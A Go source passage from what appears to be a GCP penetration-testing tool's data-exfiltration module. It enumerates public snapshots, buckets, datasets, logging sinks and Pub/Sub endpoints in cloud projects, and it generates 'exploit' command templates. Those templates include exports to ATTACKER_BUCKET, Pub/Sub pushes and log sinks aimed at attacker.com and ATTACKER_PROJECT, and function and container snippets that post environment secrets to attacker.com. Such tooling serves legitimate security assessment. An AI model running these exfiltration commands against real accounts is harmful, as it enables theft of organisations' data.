		for _, p := range sqlPaths {
			sections.WriteString(fmt.Sprintf("- %s in %s\n", p.ResourceName, p.ProjectID))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Export database to GCS\n")
		sections.WriteString("gcloud sql export sql INSTANCE_NAME \\\n")
		sections.WriteString("    gs://ATTACKER_BUCKET/exfil/dump.sql \\\n")
		sections.WriteString("    --database=DATABASE_NAME\n\n")
		sections.WriteString("# Export as CSV\n")
		sections.WriteString("gcloud sql export csv INSTANCE_NAME \\\n")
		sections.WriteString("    gs://ATTACKER_BUCKET/exfil/data.csv \\\n")
		sections.WriteString("    --database=DATABASE_NAME \\\n")
		sections.WriteString("    --query='SELECT * FROM sensitive_table'\n")
		sections.WriteString("```\n\n")
	}

	// Storage Transfer
	if len(transferPaths) > 0 {
		sections.WriteString("## Storage Transfer Service Exfiltration\n\n")
		sections.WriteString("These storage transfer jobs export data to external destinations.\n\n")
		sections.WriteString("### Identified Jobs:\n")
		for _, p := range transferPaths {
			sections.WriteString(fmt.Sprintf("- %s -> %s\n", p.ResourceName, p.Destination))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create transfer job to external AWS S3\n")
		sections.WriteString("gcloud transfer jobs create \\\n")
		sections.WriteString("    gs://SOURCE_BUCKET \\\n")
		sections.WriteString("    s3://attacker-bucket \\\n")
		sections.WriteString("    --source-creds-file=gcs-creds.json\n")
		sections.WriteString("```\n\n")
	}

	// Permission-based exfil
	if len(allPermPaths) > 0 {
		sections.WriteString("## Permission-Based Exfiltration Capabilities\n\n")
		sections.WriteString("These principals have permissions that enable data exfiltration.\n\n")

		// Group by category
		categoryPaths := make(map[string][]PermissionBasedExfilPath)
		for _, p := range allPermPaths {
			categoryPaths[p.Category] = append(categoryPaths[p.Category], p)
		}

		for category, paths := range categoryPaths {
			sections.WriteString(fmt.Sprintf("### %s\n", category))
			for _, p := range paths {
				sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", p.Principal, p.PrincipalType, p.Permission))
			}
			sections.WriteString("\n")
		}
	}

	// Potential Vectors
	if len(allVectors) > 0 {
		sections.WriteString("## Potential Exfiltration Vectors\n\n")
		sections.WriteString("These resources could be used for data exfiltration if compromised.\n\n")

		// Group by vector type
		vectorTypes := make(map[string][]PotentialVector)
		for _, v := range allVectors {
			vectorTypes[v.VectorType] = append(vectorTypes[v.VectorType], v)
		}

		for vType, vectors := range vectorTypes {
			sections.WriteString(fmt.Sprintf("### %s\n", vType))
			for _, v := range vectors {
				sections.WriteString(fmt.Sprintf("- %s in %s\n", v.ResourceName, v.ProjectID))
			}
			sections.WriteString("\n")
		}
	}

	return sections.String()
}

func (m *DataExfiltrationModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Analyzing exfiltration paths in project: %s", projectID), GCP_DATAEXFILTRATION_MODULE_NAME)
	}

	m.mu.Lock()
	m.initializeLootForProject(projectID)
	m.mu.Unlock()

	// === ACTUAL MISCONFIGURATIONS ===

	// 1. Find public/shared snapshots (REAL check)
	m.findPublicSnapshots(ctx, projectID, logger)

	// 2. Find public/shared images (REAL check)
	m.findPublicImages(ctx, projectID, logger)

	// 3. Find public buckets (REAL check)
	m.findPublicBuckets(ctx, projectID, logger)

	// 4. Find cross-project logging sinks (REAL enumeration)
	m.findCrossProjectLoggingSinks(ctx, projectID, logger)

	// 5. Find Pub/Sub push subscriptions to external endpoints (REAL check)
	m.findPubSubPushEndpoints(ctx, projectID, logger)

	// 6. Find Pub/Sub subscriptions exporting to external destinations
	m.findPubSubExportSubscriptions(ctx, projectID, logger)

	// 7. Find BigQuery datasets with public access (REAL check)
	m.findPublicBigQueryDatasets(ctx, projectID, logger)

	// 8. Find Cloud SQL with export enabled
	m.findCloudSQLExportConfig(ctx, projectID, logger)

	// 9. Find Storage Transfer jobs to external destinations
	m.findStorageTransferJobs(ctx, projectID, logger)

	// === POTENTIAL EXFILTRATION VECTORS ===

	// 10. Check for BigQuery export capability
	m.checkBigQueryExportCapability(ctx, projectID, logger)

	// 11. Check for Pub/Sub subscription capability
	m.checkPubSubCapability(ctx, projectID, logger)

	// 12. Check for Cloud Function capability
	m.checkCloudFunctionCapability(ctx, projectID, logger)

	// 13. Check for Cloud Run capability
	m.checkCloudRunCapability(ctx, projectID, logger)

	// 14. Check for Logging sink capability
	m.checkLoggingSinkCapability(ctx, projectID, logger)

	// === PERMISSION-BASED EXFILTRATION CAPABILITIES ===

	// 15. Check IAM for principals with data exfiltration permissions
	m.findPermissionBasedExfilPaths(ctx, projectID, logger)
}

// findPublicSnapshots finds snapshots that are publicly accessible
func (m *DataExfiltrationModule) findPublicSnapshots(ctx context.Context, projectID string, logger internal.Logger) {
	computeService, err := compute.NewService(ctx)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not create Compute service in project %s", projectID))
		return
	}

	req := computeService.Snapshots.List(projectID)
	err = req.Pages(ctx, func(page *compute.SnapshotList) error {
		for _, snapshot := range page.Items {
			// Get IAM policy for snapshot
			policy, err := computeService.Snapshots.GetIamPolicy(projectID, snapshot.Name).Do()
			if err != nil {
				continue
			}

			// Check for public access
			accessLevel := ""
			for _, binding := range policy.Bindings {
				for _, member := range binding.Members {
					if shared.IsPublicPrincipal(member) {
						if member == "allUsers" {
							accessLevel = "allUsers"
							break
						}
						if accessLevel != "allUsers" {
							accessLevel = "allAuthenticatedUsers"
						}
					}
				}
			}

			if accessLevel != "" {
				export := PublicExport{
					ResourceType: "Disk Snapshot",
					ResourceName: snapshot.Name,
					ProjectID:    projectID,
					AccessLevel:  accessLevel,
					DataType:     "disk_snapshot",
					Size:         fmt.Sprintf("%d GB", snapshot.DiskSizeGb),
					RiskLevel:    "CRITICAL",
				}

				path := ExfiltrationPath{
					PathType:     "Public Snapshot",
					ResourceName: snapshot.Name,
					ProjectID:    projectID,
					Description:  fmt.Sprintf("Disk snapshot (%d GB) accessible to %s", snapshot.DiskSizeGb, accessLevel),
					Destination:  "Anyone with access level: " + accessLevel,
					RiskLevel:    "CRITICAL",
					RiskReasons:  []string{"Snapshot is publicly accessible", "May contain sensitive data from disk"},
					ExploitCommand: fmt.Sprintf(
						"# Create disk from public snapshot\n"+
							"gcloud compute disks create exfil-disk --source-snapshot=projects/%s/global/snapshots/%s --zone=us-central1-a",
						projectID, snapshot.Name),
				}

				m.mu.Lock()
				m.ProjectPublicExports[projectID] = append(m.ProjectPublicExports[projectID], export)
				m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
				m.addExfiltrationPathToLoot(projectID, path)
				m.mu.Unlock()
			}
		}
		return nil
	})

	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list snapshots in project %s", projectID))
	}
}

// findPublicImages finds images that are publicly accessible
func (m *DataExfiltrationModule) findPublicImages(ctx context.Context, projectID string, logger internal.Logger) {
	computeService, err := compute.NewService(ctx)
	if err != nil {
		return
	}

	req := computeService.Images.List(projectID)
	err = req.Pages(ctx, func(page *compute.ImageList) error {
		for _, image := range page.Items {
			// Get IAM policy for image
			policy, err := computeService.Images.GetIamPolicy(projectID, image.Name).Do()
			if err != nil {
				continue
			}

			// Check for public access
			accessLevel := ""
			for _, binding := range policy.Bindings {
				for _, member := range binding.Members {
					if shared.IsPublicPrincipal(member) {
						if member == "allUsers" {
							accessLevel = "allUsers"
							break
						}
						if accessLevel != "allUsers" {
							accessLevel = "allAuthenticatedUsers"
						}
					}
				}
			}

			if accessLevel != "" {
				export := PublicExport{
					ResourceType: "VM Image",
					ResourceName: image.Name,
					ProjectID:    projectID,
					AccessLevel:  accessLevel,
					DataType:     "vm_image",
					Size:         fmt.Sprintf("%d GB", image.DiskSizeGb),
					RiskLevel:    "CRITICAL",
				}

				path := ExfiltrationPath{
					PathType:     "Public Image",
					ResourceName: image.Name,
					ProjectID:    projectID,
					Description:  fmt.Sprintf("VM image (%d GB) accessible to %s", image.DiskSizeGb, accessLevel),
					Destination:  "Anyone with access level: " + accessLevel,
					RiskLevel:    "CRITICAL",
					RiskReasons:  []string{"VM image is publicly accessible", "May contain embedded credentials or sensitive data"},
					ExploitCommand: fmt.Sprintf(
						"# Create instance from public image\n"+
							"gcloud compute instances create exfil-vm --image=projects/%s/global/images/%s --zone=us-central1-a",
						projectID, image.Name),
				}

				m.mu.Lock()
				m.ProjectPublicExports[projectID] = append(m.ProjectPublicExports[projectID], export)
				m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
				m.addExfiltrationPathToLoot(projectID, path)
				m.mu.Unlock()
			}
		}
		return nil
	})

	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list images in project %s", projectID))
	}
}

// findPublicBuckets finds GCS buckets with public access
func (m *DataExfiltrationModule) findPublicBuckets(ctx context.Context, projectID string, logger internal.Logger) {
	storageService, err := storage.NewService(ctx)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not create Storage service in project %s", projectID))
		return
	}

	resp, err := storageService.Buckets.List(projectID).Do()
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list buckets in project %s", projectID))
		return
	}

	for _, bucket := range resp.Items {
		// Get IAM policy for bucket
		policy, err := storageService.Buckets.GetIamPolicy(bucket.Name).Do()
		if err != nil {
			continue
		}

		// Check for public access
		accessLevel := ""
		for _, binding := range policy.Bindings {
			for _, member := range binding.Members {
				if shared.IsPublicPrincipal(member) {
					if member == "allUsers" {
						accessLevel = "allUsers"
						break
					}
					if accessLevel != "allUsers" {
						accessLevel = "allAuthenticatedUsers"
					}
				}
			}
		}

		if accessLevel != "" {
			export := PublicExport{
				ResourceType: "Storage Bucket",
				ResourceName: bucket.Name,
				ProjectID:    projectID,
				AccessLevel:  accessLevel,
				DataType:     "gcs_bucket",
				RiskLevel:    "CRITICAL",
			}

			path := ExfiltrationPath{
				PathType:     "Public Bucket",
				ResourceName: bucket.Name,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("GCS bucket accessible to %s", accessLevel),
				Destination:  "Anyone with access level: " + accessLevel,
				RiskLevel:    "CRITICAL",
				RiskReasons:  []string{"Bucket is publicly accessible", "May contain sensitive files"},
				ExploitCommand: fmt.Sprintf(
					"# List public bucket contents\n"+
						"gsutil ls -r gs://%s/\n"+
						"# Download all files\n"+
						"gsutil -m cp -r gs://%s/ ./exfil/",
					bucket.Name, bucket.Name),
			}

			m.mu.Lock()
			m.ProjectPublicExports[projectID] = append(m.ProjectPublicExports[projectID], export)
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findCrossProjectLoggingSinks finds REAL logging sinks that export to external destinations
func (m *DataExfiltrationModule) findCrossProjectLoggingSinks(ctx context.Context, projectID string, logger internal.Logger) {
	ls := loggingservice.New()
	sinks, err := ls.Sinks(projectID)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list logging sinks in project %s", projectID))
		return
	}

	for _, sink := range sinks {
		if sink.Disabled {
			continue
		}

		// Only report cross-project or external sinks
		if sink.IsCrossProject {
			riskLevel := "HIGH"
			if sink.DestinationType == "pubsub" {
				riskLevel = "MEDIUM" // Pub/Sub is often used for legitimate cross-project messaging
			}

			destDesc := fmt.Sprintf("%s in project %s", sink.DestinationType, sink.DestinationProject)

			path := ExfiltrationPath{
				PathType:     "Logging Sink",
				ResourceName: sink.Name,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("Logs exported to %s", destDesc),
				Destination:  sink.Destination,
				RiskLevel:    riskLevel,
				RiskReasons:  []string{"Logs exported to different project", "May contain sensitive information in log entries"},
				ExploitCommand: fmt.Sprintf(
					"# View sink configuration\n"+
						"gcloud logging sinks describe %s --project=%s\n"+
						"# Check destination permissions\n"+
						"# Destination: %s",
					sink.Name, projectID, sink.Destination),
			}

			m.mu.Lock()
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findPubSubPushEndpoints finds Pub/Sub subscriptions pushing to external HTTP endpoints
func (m *DataExfiltrationModule) findPubSubPushEndpoints(ctx context.Context, projectID string, logger internal.Logger) {
	ps := pubsubservice.New()
	subs, err := ps.Subscriptions(projectID)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list Pub/Sub subscriptions in project %s", projectID))
		return
	}

	for _, sub := range subs {
		if sub.PushEndpoint == "" {
			continue
		}

		// Check if endpoint is external (not run.app, cloudfunctions.net, or same project)
		endpoint := sub.PushEndpoint
		isExternal := true
		if strings.Contains(endpoint, ".run.app") ||
			strings.Contains(endpoint, ".cloudfunctions.net") ||
			strings.Contains(endpoint, "appspot.com") ||
			strings.Contains(endpoint, "googleapis.com") {
			isExternal = false
		}

		if isExternal {
			riskLevel := "HIGH"

			path := ExfiltrationPath{
				PathType:     "Pub/Sub Push",
				ResourceName: sub.Name,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("Subscription pushes messages to external endpoint"),
				Destination:  endpoint,
				RiskLevel:    riskLevel,
				RiskReasons:  []string{"Messages pushed to external HTTP endpoint", "Endpoint may be attacker-controlled"},
				ExploitCommand: fmt.Sprintf(
					"# View subscription configuration\n"+
						"gcloud pubsub subscriptions describe %s --project=%s\n"+
						"# Test endpoint\n"+
						"curl -v %s",
					sub.Name, projectID, endpoint),
			}

			m.mu.Lock()
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findPubSubExportSubscriptions finds Pub/Sub subscriptions exporting to BigQuery or GCS
func (m *DataExfiltrationModule) findPubSubExportSubscriptions(ctx context.Context, projectID string, logger internal.Logger) {
	ps := pubsubservice.New()
	subs, err := ps.Subscriptions(projectID)
	if err != nil {
		return
	}

	for _, sub := range subs {
		// Check for BigQuery export
		if sub.BigQueryTable != "" {
			// Extract project from table reference
			parts := strings.Split(sub.BigQueryTable, ".")
			if len(parts) >= 1 {
				destProject := parts[0]
				if destProject != projectID {
					path := ExfiltrationPath{
						PathType:     "Pub/Sub BigQuery Export",
						ResourceName: sub.Name,
						ProjectID:    projectID,
						Description:  "Subscription exports messages to BigQuery in different project",
						Destination:  sub.BigQueryTable,
						RiskLevel:    "MEDIUM",
						RiskReasons:  []string{"Messages exported to different project", "Data flows outside source project"},
						ExploitCommand: fmt.Sprintf(
							"gcloud pubsub subscriptions describe %s --project=%s",
							sub.Name, projectID),
					}

					m.mu.Lock()
					m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
					m.addExfiltrationPathToLoot(projectID, path)
					m.mu.Unlock()
				}
			}
		}

		// Check for Cloud Storage export
		if sub.CloudStorageBucket != "" {
			path := ExfiltrationPath{
				PathType:     "Pub/Sub GCS Export",
				ResourceName: sub.Name,
				ProjectID:    projectID,
				Description:  "Subscription exports messages to Cloud Storage bucket",
				Destination:  "gs://" + sub.CloudStorageBucket,
				RiskLevel:    "MEDIUM",
				RiskReasons:  []string{"Messages exported to Cloud Storage", "Bucket may be accessible externally"},
				ExploitCommand: fmt.Sprintf(
					"gcloud pubsub subscriptions describe %s --project=%s\n"+
						"gsutil ls gs://%s/",
					sub.Name, projectID, sub.CloudStorageBucket),
			}

			m.mu.Lock()
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findPublicBigQueryDatasets finds BigQuery datasets with public IAM bindings
func (m *DataExfiltrationModule) findPublicBigQueryDatasets(ctx context.Context, projectID string, logger internal.Logger) {
	bq := bigqueryservice.New()
	datasets, err := bq.BigqueryDatasets(projectID)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list BigQuery datasets in project %s", projectID))
		return
	}

	for _, dataset := range datasets {
		// Check if dataset has public access (already computed by the service)
		if dataset.IsPublic {
			export := PublicExport{
				ResourceType: "BigQuery Dataset",
				ResourceName: dataset.DatasetID,
				ProjectID:    projectID,
				AccessLevel:  dataset.PublicAccess,
				DataType:     "bigquery_dataset",
				RiskLevel:    "CRITICAL",
			}

			path := ExfiltrationPath{
				PathType:     "Public BigQuery",
				ResourceName: dataset.DatasetID,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("BigQuery dataset accessible to %s", dataset.PublicAccess),
				Destination:  "Anyone with access level: " + dataset.PublicAccess,
				RiskLevel:    "CRITICAL",
				RiskReasons:  []string{"Dataset is publicly accessible", "Data can be queried by anyone"},
				ExploitCommand: fmt.Sprintf(
					"# Query public dataset\n"+
						"bq query --use_legacy_sql=false 'SELECT * FROM `%s.%s.INFORMATION_SCHEMA.TABLES`'\n"+
						"# Export data\n"+
						"bq extract --destination_format=CSV '%s.%s.TABLE_NAME' gs://your-bucket/export.csv",
					projectID, dataset.DatasetID, projectID, dataset.DatasetID),
			}

			m.mu.Lock()
			m.ProjectPublicExports[projectID] = append(m.ProjectPublicExports[projectID], export)
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findCloudSQLExportConfig finds Cloud SQL instances with export configurations
func (m *DataExfiltrationModule) findCloudSQLExportConfig(ctx context.Context, projectID string, logger internal.Logger) {
	sqlService, err := sqladmin.NewService(ctx)
	if err != nil {
		return
	}

	resp, err := sqlService.Instances.List(projectID).Do()
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list Cloud SQL instances in project %s", projectID))
		return
	}

	for _, instance := range resp.Items {
		// Check if instance has automated backups enabled with export to GCS
		if instance.Settings != nil && instance.Settings.BackupConfiguration != nil {
			backup := instance.Settings.BackupConfiguration
			if backup.Enabled && backup.BinaryLogEnabled {
				// Instance has binary logging - can export via CDC
				path := ExfiltrationPath{
					PathType:     "Cloud SQL Export",
					ResourceName: instance.Name,
					ProjectID:    projectID,
					Description:  "Cloud SQL instance with binary logging enabled (enables CDC export)",
					Destination:  "External via mysqldump/pg_dump or CDC",
					RiskLevel:    "LOW", // This is standard config, not necessarily a risk
					RiskReasons:  []string{"Binary logging enables change data capture", "Data can be exported if IAM allows"},
					ExploitCommand: fmt.Sprintf(
						"# Check export permissions\n"+
							"gcloud sql instances describe %s --project=%s\n"+
							"# Export if permitted\n"+
							"gcloud sql export sql %s gs://bucket/export.sql --database=mydb",
						instance.Name, projectID, instance.Name),
				}

				m.mu.Lock()
				m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
				m.addExfiltrationPathToLoot(projectID, path)
				m.mu.Unlock()
			}
		}
	}
}

// findStorageTransferJobs finds Storage Transfer Service jobs to external destinations
func (m *DataExfiltrationModule) findStorageTransferJobs(ctx context.Context, projectID string, logger internal.Logger) {
	stsService, err := storagetransfer.NewService(ctx)
	if err != nil {
		return
	}

	// List transfer jobs for this project - filter is a required parameter
	filter := fmt.Sprintf(`{"projectId":"%s"}`, projectID)
	req := stsService.TransferJobs.List(filter)
	err = req.Pages(ctx, func(page *storagetransfer.ListTransferJobsResponse) error {
		for _, job := range page.TransferJobs {
			if job.Status != "ENABLED" {
				continue
			}

			// Check for external destinations (AWS S3, Azure Blob, HTTP)
			var destination string
			var destType string
			var isExternal bool

			if job.TransferSpec != nil {
				if job.TransferSpec.AwsS3DataSource != nil {
					destination = fmt.Sprintf("s3://%s", job.TransferSpec.AwsS3DataSource.BucketName)
					destType = "AWS S3"
					isExternal = true
				}
				if job.TransferSpec.AzureBlobStorageDataSource != nil {
					destination = fmt.Sprintf("azure://%s/%s",
						job.TransferSpec.AzureBlobStorageDataSource.StorageAccount,
						job.TransferSpec.AzureBlobStorageDataSource.Container)
					destType = "Azure Blob"
					isExternal = true
				}
				if job.TransferSpec.HttpDataSource != nil {
					destination = job.TransferSpec.HttpDataSource.ListUrl
					destType = "HTTP"
					isExternal = true
				}
			}

			if isExternal {
				path := ExfiltrationPath{
					PathType:     "Storage Transfer",
					ResourceName: job.Name,
					ProjectID:    projectID,
					Description:  fmt.Sprintf("Transfer job to %s", destType),
					Destination:  destination,
					RiskLevel:    "HIGH",
					RiskReasons:  []string{"Data transferred to external cloud provider", "Destination outside GCP control"},
					ExploitCommand: fmt.Sprintf(
						"# View transfer job\n"+
							"gcloud transfer jobs describe %s",
						job.Name),
				}

				m.mu.Lock()
				m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
				m.addExfiltrationPathToLoot(projectID, path)
				m.mu.Unlock()
			}
		}
		return nil
	})

	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list Storage Transfer jobs for project %s", projectID))
	}
}

// ------------------------------
// Potential Vector Checks
// ------------------------------

// checkBigQueryExportCapability checks if BigQuery datasets exist (can export to GCS/external)
func (m *DataExfiltrationModule) checkBigQueryExportCapability(ctx context.Context, projectID string, logger internal.Logger) {
	bq := bigqueryservice.New()
	datasets, err := bq.BigqueryDatasets(projectID)
	if err != nil {
		return // Silently skip - API may not be enabled
	}

	if len(datasets) > 0 {
		vector := PotentialVector{
			VectorType:   "BigQuery Export",
			ResourceName: "*",
			ProjectID:    projectID,
			Description:  "BigQuery can export data to GCS bucket or external table",
			Destination:  "GCS bucket or external table",
			ExploitCommand: fmt.Sprintf(`# List all datasets in project
bq ls --project_id=%s

# List tables in a dataset
bq ls %s:DATASET_NAME

# Export table to GCS (requires storage.objects.create on bucket)
bq extract --destination_format=CSV '%s:DATASET.TABLE' gs://YOUR_BUCKET/export.csv

# Export to external table (federated query)
bq query --use_legacy_sql=false 'SELECT * FROM EXTERNAL_QUERY("connection_id", "SELECT * FROM table")'

# Create external table pointing to GCS
bq mk --external_table_definition=gs://bucket/file.csv@CSV DATASET.external_table`, projectID, projectID, projectID),
		}

		m.mu.Lock()
		m.ProjectPotentialVectors[projectID] = append(m.ProjectPotentialVectors[projectID], vector)
		m.addPotentialVectorToLoot(projectID, vector)
		m.mu.Unlock()
	}
}

// checkPubSubCapability checks if Pub/Sub topics/subscriptions exist
func (m *DataExfiltrationModule) checkPubSubCapability(ctx context.Context, projectID string, logger internal.Logger) {
	ps := pubsubservice.New()
	subs, err := ps.Subscriptions(projectID)
	if err != nil {
		return // Silently skip
	}

	if len(subs) > 0 {
		vector := PotentialVector{
			VectorType:   "Pub/Sub Subscription",
			ResourceName: "*",
			ProjectID:    projectID,
			Description:  "Pub/Sub can push messages to external HTTP endpoint",
			Destination:  "External HTTP endpoint",
			ExploitCommand: fmt.Sprintf(`# List all subscriptions
gcloud pubsub subscriptions list --project=%s

# Create a push subscription to external endpoint (requires pubsub.subscriptions.create)
gcloud pubsub subscriptions create exfil-sub \
  --topic=TOPIC_NAME \
  --push-endpoint=https://attacker.com/collect \
  --project=%s

# Pull messages from existing subscription (requires pubsub.subscriptions.consume)
gcloud pubsub subscriptions pull SUB_NAME --auto-ack --limit=100 --project=%s

# Modify existing subscription to push to external endpoint
gcloud pubsub subscriptions modify-push-config SUB_NAME \
  --push-endpoint=https://attacker.com/collect \
  --project=%s`, projectID, projectID, projectID, projectID),
		}

		m.mu.Lock()
		m.ProjectPotentialVectors[projectID] = append(m.ProjectPotentialVectors[projectID], vector)
		m.addPotentialVectorToLoot(projectID, vector)
		m.mu.Unlock()
	}
}

// checkCloudFunctionCapability checks if Cloud Functions exist
func (m *DataExfiltrationModule) checkCloudFunctionCapability(ctx context.Context, projectID string, logger internal.Logger) {
	functionsService, err := cloudfunctions.NewService(ctx)
	if err != nil {
		return
	}

	parent := fmt.Sprintf("projects/%s/locations/-", projectID)
	resp, err := functionsService.Projects.Locations.Functions.List(parent).Do()
	if err != nil {
		return // Silently skip
	}

	if len(resp.Functions) > 0 {
		vector := PotentialVector{
			VectorType:   "Cloud Function",
			ResourceName: "*",
			ProjectID:    projectID,
			Description:  "Cloud Functions can make outbound HTTP requests to external endpoints",
			Destination:  "External HTTP endpoint",
			ExploitCommand: fmt.Sprintf(`# List all Cloud Functions
gcloud functions list --project=%s

# If you can update function code, add exfiltration logic:
# - Read secrets/data from project resources
# - Send HTTP POST to external endpoint

# Example: Deploy function that exfiltrates data
# function code (index.js):
# const https = require('https');
# exports.exfil = (req, res) => {
#   const data = JSON.stringify({secrets: process.env});
#   const options = {hostname: 'attacker.com', path: '/collect', method: 'POST'};
#   https.request(options).write(data);
#   res.send('ok');
# };

# Invoke a function (if publicly accessible or you have invoker role)
gcloud functions call FUNCTION_NAME --project=%s

# View function source
gcloud functions describe FUNCTION_NAME --project=%s`, projectID, projectID, projectID),
		}

		m.mu.Lock()
		m.ProjectPotentialVectors[projectID] = append(m.ProjectPotentialVectors[projectID], vector)
		m.addPotentialVectorToLoot(projectID, vector)
		m.mu.Unlock()
	}
}

// checkCloudRunCapability checks if Cloud Run services exist
func (m *DataExfiltrationModule) checkCloudRunCapability(ctx context.Context, projectID string, logger internal.Logger) {
	runService, err := run.NewService(ctx)
	if err != nil {
		return
	}

	parent := fmt.Sprintf("projects/%s/locations/-", projectID)
	resp, err := runService.Projects.Locations.Services.List(parent).Do()
	if err != nil {
		return // Silently skip
	}

	if len(resp.Items) > 0 {
		vector := PotentialVector{
			VectorType:   "Cloud Run",
			ResourceName: "*",
			ProjectID:    projectID,
			Description:  "Cloud Run services can make outbound HTTP requests to external endpoints",
			Destination:  "External HTTP endpoint",
			ExploitCommand: fmt.Sprintf(`# List all Cloud Run services
gcloud run services list --project=%s

# If you can update service, add exfiltration logic in container
# Cloud Run containers have full network egress by default

# Example: Deploy container that exfiltrates environment/metadata
# Dockerfile:
# FROM python:3.9-slim
# COPY exfil.py .
# CMD ["python", "exfil.py"]

# exfil.py:
# import os, requests
# requests.post('https://attacker.com/collect', json={
#   'env': dict(os.environ),
#   'metadata': requests.get('http://metadata.google.internal/...').text
# })

# View service details
gcloud run services describe SERVICE_NAME --region=REGION --project=%s

# Invoke service (if you have invoker role)
curl -H "Authorization: Bearer $(gcloud auth print-identity-token)" SERVICE_URL`, projectID, projectID),
		}

		m.mu.Lock()
		m.ProjectPotentialVectors[projectID] = append(m.ProjectPotentialVectors[projectID], vector)
		m.addPotentialVectorToLoot(projectID, vector)
		m.mu.Unlock()
	}
}

// checkLoggingSinkCapability checks if logging sinks can be created
func (m *DataExfiltrationModule) checkLoggingSinkCapability(ctx context.Context, projectID string, logger internal.Logger) {
	ls := loggingservice.New()
	sinks, err := ls.Sinks(projectID)
	if err != nil {
		return // Silently skip
	}

	// If we can list sinks, we might be able to create them
	// Also check if there's an existing sink we could modify
	hasCrossProjectSink := false
	for _, sink := range sinks {
		if sink.IsCrossProject {
			hasCrossProjectSink = true
			break
		}
	}

	// Add as potential vector if logging API is accessible
	vector := PotentialVector{
		VectorType:   "Logging Sink",
		ResourceName: "*",
		ProjectID:    projectID,
		Description:  "Logs can be exported to external project or Pub/Sub topic",
		Destination:  "External project or Pub/Sub topic",
		ExploitCommand: fmt.Sprintf(`# List existing logging sinks
gcloud logging sinks list --project=%s

# Create a sink to export logs to attacker-controlled destination
# (requires logging.sinks.create permission)

# Export to Pub/Sub topic in another project
gcloud logging sinks create exfil-sink \
  pubsub.googleapis.com/projects/ATTACKER_PROJECT/topics/stolen-logs \
  --log-filter='resource.type="gce_instance"' \
  --project=%s

# Export to BigQuery in another project
gcloud logging sinks create exfil-sink \
  bigquery.googleapis.com/projects/ATTACKER_PROJECT/datasets/stolen_logs \
  --log-filter='resource.type="gce_instance"' \
  --project=%s

# Export to GCS bucket
gcloud logging sinks create exfil-sink \
  storage.googleapis.com/attacker-bucket \
  --log-filter='resource.type="gce_instance"' \
  --project=%s

# Modify existing sink destination (requires logging.sinks.update)
gcloud logging sinks update SINK_NAME \
  --destination=pubsub.googleapis.com/projects/ATTACKER_PROJECT/topics/stolen \
  --project=%s`, projectID, projectID, projectID, projectID, projectID),
	}

	// Only add if there's evidence logging is actively used or we found sinks
	if len(sinks) > 0 || hasCrossProjectSink {
		m.mu.Lock()
		m.ProjectPotentialVectors[projectID] = append(m.ProjectPotentialVectors[projectID], vector)
		m.addPotentialVectorToLoot(projectID, vector)
		m.mu.Unlock()
	}
}

// findPermissionBasedExfilPaths identifies principals with data exfiltration permissions
// This now uses the centralized attackpathService for project-level analysis only
// Org/folder/resource level analysis is done separately in findAllLevelExfilPaths
func (m *DataExfiltrationModule) findPermissionBasedExfilPaths(ctx context.Context, projectID string, logger internal.Logger) {
	// Use attackpathService for project-level analysis
	attackSvc := attackpathservice.New()

	projectName := m.GetProjectName(projectID)
	paths, err := attackSvc.AnalyzeProjectAttackPaths(ctx, projectID, projectName, "exfil")
	if err != nil {
